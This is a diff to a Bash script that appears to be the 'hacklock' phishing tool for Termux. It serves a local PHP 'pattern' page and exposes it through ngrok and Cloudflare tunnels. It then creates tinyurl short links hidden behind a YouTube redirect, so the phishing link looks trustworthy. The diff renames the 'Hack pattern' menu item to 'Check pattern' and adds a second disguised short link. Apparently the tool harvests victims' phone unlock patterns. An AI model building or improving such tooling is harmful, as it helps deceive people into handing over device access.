@@ -69,7 +69,7 @@ command -v wget > /dev/null 2>&1 || { echo >&2 "I require Wget but it's not inst
 
 ####### Menu of the tool #######
 menu() {
-printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Hack pattern\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Check pattern\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m More Tools\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Chat\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Fix \e[0m\n"
@@ -128,7 +128,7 @@ pkill -f -2 php > /dev/null 2>&1
 killall -2 php > /dev/null 2>&1
 fi
 
-if [[ $checkngrok == *'proot'* ]]; then
+if [[ $checkproot == *'proot'* ]]; then
 pkill -f -2 proot > /dev/null 2>&1
 killall -2 proot > /dev/null 2>&1
 fi
@@ -150,11 +150,11 @@ printf "\e[1;92m  _|    _|                      _|        _|                    
 printf "\e[1;92m  _|    _|    _|_|_|    _|_|_|  _|  _|    _|          _|_|      _|_|_|  _|  _| \e[0m\n"
 printf "\e[1;92m  _|_|_|_|  _|    _|  _|        _|_|      _|        _|    _|  _|        _|_\e[0m\n"
 printf "\e[1;92m  _|    _|  _|    _|  _|        _|  _|    _|        _|    _|  _|        _|  _|\e[0m\n"
-printf "\e[1;92m  _|    _|    _|_|_|    _|_|_|  _|    _|  _|_|_|_|    _|_|      _|_|_|  _|    _| v1.2 \e[0m\n"
+printf "\e[1;92m  _|    _|    _|_|_|    _|_|_|  _|    _|  _|_|_|_|    _|_|      _|_|_|  _|    _| v2.0 \e[0m\n"
 printf "\n"
-printf "                  \e[104m\e[1;77m  >>  Script By N17R0 << \e[0m\n"
+printf "                        \e[104m\e[1;77m  >>  Script By N17R0 << \e[0m\n"
 printf "\n"
-printf "           \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Noob Hackers \e[100m\e[1;77m << \e[0m\n"
+printf "                 \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Noob Hackers \e[100m\e[1;77m << \e[0m\n"
 printf "\n"
 }
 
@@ -222,14 +222,16 @@ cd $HOME/hacklock/core/pattern && php -S 127.0.0.1:5678 > /dev/null 2>&1 &
 sleep 5
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting forward servers...\n"
 ./ngrok http 127.0.0.1:5678 > /dev/null 2>&1 &
-termux-chroot ./cloudflared -url 127.0.0.1:5678 --logfile ${PWD}/cloudflare-log > /dev/null 2>&1 &
+termux-chroot ./cloudflared -url 127.0.0.1:5678 --logfile $HOME/hacklock/cloudflare-log > /dev/null 2>&1 &
 sleep 20
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
-clflare=$(grep -o 'https://[-0-9a-z]*.trycloudflare.com' "${PWD}/cloudflare-log")
+flare=$(grep -o 'https://[-0-9a-z]*.trycloudflare.com' "$HOME/hacklock/cloudflare-log")
 printf "\e[1;92m[\e[0m*\e[1;92m] (NGROK) link:\e[0m\e[1;77m %s\e[0m\n" $link
-printf "\e[1;92m[\e[0m*\e[1;92m] (CooudFlare) link:\e[0m\e[1;77m %s\e[0m\n" $clflare
-send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
+printf "\e[1;92m[\e[0m*\e[1;92m] (Cloud Flare) link:\e[0m\e[1;77m %s\e[0m\n" $flare
+ngrok_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Ngrok Short:\e[0m\e[1;77m %s \n' $ngrok_ip
+cloud_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$flare" | head -n1)
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Cloud Short:\e[0m\e[1;77m %s \n' $cloud_ip
 printf "\n"
 checkfound
 }
